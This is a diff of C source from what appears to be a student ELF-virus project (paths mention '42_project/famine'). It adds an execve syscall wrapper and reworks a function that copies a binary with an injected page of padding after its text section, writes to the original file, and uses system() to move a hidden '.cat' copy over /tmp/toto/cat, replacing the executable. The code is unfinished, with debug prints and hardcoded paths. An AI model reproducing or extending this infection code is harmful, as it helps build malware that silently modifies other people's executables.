@@ -56,6 +56,8 @@ type name(type1 arg1,type2 arg2, type3 arg3, type4 arg4)\
 
 
 __syscall3(size_t, read, int, fd, void *, buf, size_t, count);
+__syscall3(int, execve, const char *, filename,  char const**, argv,  char const**,  envp);
+
 __syscall2(int, munmap, void *, addr, size_t, length);
 __syscall2(int, fstat, int, fildes, struct stat * , buf);
 __syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
@@ -116,6 +118,19 @@ void    *ft_memcpy(void *dst, const void *src, size_t n)
 		i++;
 	}
 	return ((void *)dst);
+}
+
+static char    *only_name(char *line)
+{
+	int        size;
+	size = ft_strlen(line);
+	size++;
+	while (--size)
+	{
+		if (line[size] == '/')
+			return (&(line[size + 1]));
+	}
+	return (line);
 }
 
 void    *ft_memmove(void *dst, const void *src, size_t len)
@@ -213,8 +228,13 @@ void new_file(t_file *file, size_t end_of_text,char *path)
 	int fd;
 	char *data;
 	char tmp[125];
-	tmp[0] = '/';
-	ft_memmove(tmp + 1,path, ft_strlen(path));
+
+	for (int i = 0; i< 125;i++)
+		tmp[i] = 0;
+	ft_memmove(tmp,path,ft_strlen(path));
+
+	ft_memmove(only_name(tmp) + 1,only_name(tmp), ft_strlen(only_name(tmp)));
+	*only_name(tmp) = '.';
 	printf("new_file debut %s\n",tmp);
 	if ((fd = open (tmp, O_CREAT | O_RDWR | O_TRUNC, 0755)) < 0)
 	{
@@ -237,6 +257,9 @@ void new_file(t_file *file, size_t end_of_text,char *path)
 	///write(fd,file->data,file->size + PAGE_SIZE);
 
 	write(fd,file->data, end_of_text);
+
+	write(file->fd,file->data, PAGE_SIZE);
+
 	for (int i = 0; i< PAGE_SIZE;i++)
 		write(fd,"j",1);
 	write(fd,file->data + end_of_text, file->size - end_of_text);
@@ -250,6 +273,9 @@ void new_file(t_file *file, size_t end_of_text,char *path)
 	munmap(data, file->size + PAGE_SIZE);
 	int ret = rename (tmp, "/root/42_project/famine/a");
 	printf("fin memove %d\n",ret);
+	char argv[] = "mv /tmp/toto/.cat /tmp/toto/cat";
+	system(argv);
+
 	perror("retour");
 
 }
